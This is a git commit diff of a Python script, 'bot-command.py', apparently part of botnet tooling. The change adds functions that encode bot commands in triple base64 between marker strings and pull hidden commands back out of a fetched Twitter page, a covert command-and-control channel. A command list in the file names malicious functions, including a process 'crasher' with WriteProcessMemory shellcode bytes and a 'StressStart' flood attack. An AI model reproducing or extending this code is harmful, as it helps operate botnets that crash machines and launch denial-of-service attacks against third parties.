95f5b899d4c90b661e904ef52cd637cab63b4de0
Voraka <Voraka@users.noreply.github.com>
2017-09-27 17:49:38 +0800

    Update bot-command.py

--- bot-command.py
+++ bot-command.py
@@ -24,6 +24,19 @@ def read_twitter():
 	html = urlopen(url).read()
 	return html 
 
+def generate_cmd_old():
+	cmd_str = ""
+	cmd1 = "COMMAND"	
+	cmd2 = "COMMAND_END"
+	cmd = "Crazymouse"
+	cut = "-CUT-"
+	param1 = "10"
+	# param2 = "info!"
+	cmd_str = cmd+cut+param1
+	# cmd_str = cmd
+	cmd_str_en = en_base64(en_base64(en_base64(cmd1)))+en_base64(en_base64(en_base64(cmd_str)))+en_base64(en_base64(en_base64(cmd2)))
+	print len(cmd_str_en)
+	print cmd_str_en
 	
 	
 def generate_cmd():
@@ -38,10 +51,13 @@ def generate_cmd():
 	# cmd_str = cmd
 	cmd_str_en = en_base64(en_base64(en_base64(cmd1)))+en_base64(en_base64(en_base64(cmd_str)))+en_base64(en_base64(en_base64(cmd2)))
 	print len(cmd_str_en)
-	return cmd_str_en
+	print cmd_str_en
+
+def get_cmd():
+	html = read_twitter()
+	cmd = de_base64(de_base64(de_base64(get_between(html, en_base64(en_base64(en_base64(cmd1))), en_base64(en_base64(en_base64(cmd2)))))))
+	print cmd
 	
-cmd1 = "COMMAND"	
-cmd2 = "COMMAND_END"
 commands = [
 "FileAttribute",
 "crasher",	#WriteProcessMemory (hexcode: A1 FC FF FF FF 99 F7 3D FC FF FF FF A3 F8 FF FF FF A1 F8 FF FF FF)
@@ -83,17 +99,6 @@ commands = [
 "BatchScripting",
 "StressStart",	# flood attack
 "StressStop"
-]
-
-# html = read_twitter()
-# html = read_twitter_old()
-# cmd1 = "COMMAND"	
-# cmd2 = "COMMAND_END"
-# cmd = de_base64(de_base64(de_base64(get_between(html, en_base64(en_base64(en_base64(cmd1))), en_base64(en_base64(en_base64(cmd2)))))))
-# print cmd
-cmd = generate_cmd()
-# cmd = generate_cmd_old()
-print cmd
-
-
-
+]	
+	
+cmd = generate_cmd_old()
